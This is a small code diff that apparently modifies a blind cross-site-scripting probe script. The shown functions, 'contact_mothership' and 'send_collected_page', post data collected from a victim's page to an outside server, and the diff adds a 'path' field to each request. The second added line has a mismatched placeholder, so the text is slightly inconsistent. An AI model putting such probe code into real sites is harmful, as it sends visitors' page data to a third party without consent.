@@ -178,6 +178,7 @@ function contact_mothership(probe_return_data) {
 
         }
     }
+    form_data.append("path", "[USER_PATH]");
     http.send(form_data);
 }
 
@@ -196,6 +197,7 @@ function send_collected_page( page_data ) {
 
         }
     }
+    form_data.append("path", "[USER_PATH");
     http.send(form_data);
 }
 
